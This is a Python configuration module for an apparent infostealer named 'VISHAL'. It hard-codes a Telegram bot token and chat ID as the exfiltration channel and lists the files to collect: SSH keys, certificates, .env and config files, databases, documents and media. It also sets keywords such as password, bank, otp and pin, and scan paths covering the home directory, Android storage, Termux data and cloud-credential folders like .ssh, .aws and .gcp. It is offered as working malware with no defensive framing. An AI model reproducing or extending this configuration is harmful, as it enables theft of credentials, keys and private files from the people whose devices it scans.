"""
VISHAL Configuration Module
"""
import os
import base64
import json
from pathlib import Path

class Config:
    """Main Configuration Class"""
    
    # Telegram Bot Configuration
    BOT_TOKEN = "8002463739:AAF2lrzPkq2yltR67P3Rd-9-h87S97ffWbI"
    CHAT_ID = "7335168552"
    
    # File Collection Settings
    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
    SCAN_INTERVAL = 300  # 5 minutes
    DELAY_BETWEEN_FILES = 2  # seconds
    
    # Target Extensions
    TARGET_EXTENSIONS = [
        # Web Files
        '*.php', '*.html', '*.htm', '*.js', '*.css', '*.xml', '*.json',
        
        # Python Files
        '*.py', '*.pyc', '*.pyo', '*.pyd', '*.ipynb',
        
        # Database Files
        '*.sql', '*.db', '*.sqlite', '*.sqlite3', '*.mdb', '*.accdb',
        
        # Config Files
        '*.conf', '*.config', '*.cfg', '*.ini', '*.env', '*.yml', '*.yaml',
        
        # Document Files
        '*.txt', '*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx', '*.ppt', '*.pptx',
        
        # Image Files
        '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.svg', '*.ico',
        
        # Video Files
        '*.mp4', '*.avi', '*.mkv', '*.mov', '*.wmv', '*.flv',
        
        # Audio Files
        '*.mp3', '*.wav', '*.aac', '*.ogg', '*.flac',
        
        # Archive Files
        '*.zip', '*.rar', '*.7z', '*.tar', '*.gz', '*.bz2',
        
        # SSH Keys
        '*.pem', '*.ppk', '*.key', '*.pub', '*.crt', '*.p12',
        
        # Android/Termux Specific
        '*.apk', '*.dex', '*.smali', '*.termux', '*.bashrc', '*.zshrc',
        
        # Other Important
        '*.log', '*.bak', '*.backup', '*.old', '*.tmp', '*.temp'
    ]
    
    # Sensitive Keywords
    SENSITIVE_KEYWORDS = [
        'password', 'passwd', 'pwd', 'secret', 'key', 'token',
        'auth', 'login', 'credential', 'bank', 'otp', 'pin',
        'private', 'ssh', 'wp-config', 'config', 'env'
    ]
    
    # Paths to Scan
    SCAN_PATHS = [
        str(Path.home()),  # Home directory
        '/sdcard',  # Android storage
        '/storage',  # External storage
        '/data/data/com.termux',  # Termux data
    ]
    
    # Hidden Paths
    HIDDEN_PATHS = [
        '.git', '.svn', '.env', '.config', '.ssh',
        '.aws', '.gcp', '.azure', '.npm', '.cargo'
    ]
    
    @classmethod
    def get_all_extensions(cls):
        """Return all target extensions"""
        return cls.TARGET_EXTENSIONS
    
    @classmethod
    def get_web_extensions(cls):
        """Return web-related extensions"""
        return ['*.php', '*.html', '*.js', '*.css', '*.xml', '*.json']
    
    @classmethod
    def get_sensitive_extensions(cls):
        """Return sensitive file extensions"""
        return ['*.env', '*.key', '*.pem', '*.crt', '*.conf', '*.config']
    
    @classmethod
    def is_sensitive(cls, filename):
        """Check if file is sensitive"""
        filename = filename.lower()
        return any(keyword in filename for keyword in cls.SENSITIVE_KEYWORDS)